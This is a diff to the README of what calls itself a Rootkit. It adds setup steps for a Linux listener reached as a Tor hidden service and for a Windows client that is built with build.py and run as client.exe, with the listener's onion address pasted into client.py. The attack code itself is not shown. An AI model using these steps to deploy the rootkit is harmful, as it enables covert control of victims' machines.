@@ -8,9 +8,10 @@ The exe Rootkit-File contains the tor expert bundle, so no staged payload is nee
 First clone the git repository and change directory into the repo.
 
 ### Listener
-Note: The Listener is desgined to run on linux.
-In order for the listener to work you need to configure a Tor Hidden Service in /etc/tor/torrc,
-with the base directory being /var/lib/tor.
+Install all dependencies:
+```bash
+pip3 install -r listener/requirements.txt
+```
 
 After that the listener can be run with:
 ```bash
@@ -23,7 +24,10 @@ chmod +x
 ```
 
 ### Client
-Note: The compilation of the Rootkit client ONLY works on Windows. 
+Note: The compilation of the Rootkit client ONLY works on Windows.
+
+**Insert the Onion Address the Listener prints upon running into client\client.py,
+otherwise the client wont work!**
 
 Install all dependencies:
 ```bash
@@ -36,6 +40,14 @@ python client\build.py
 The .exe file should now be at:
 ```bash
 .\client\dist\client.exe
+```
+Tor run the client just execute client.exe:
+```bash
+.\client.exe
+```
+Or run the client with the python interpreter:
+```bash
+python client.py
 ```
 
 ## Features
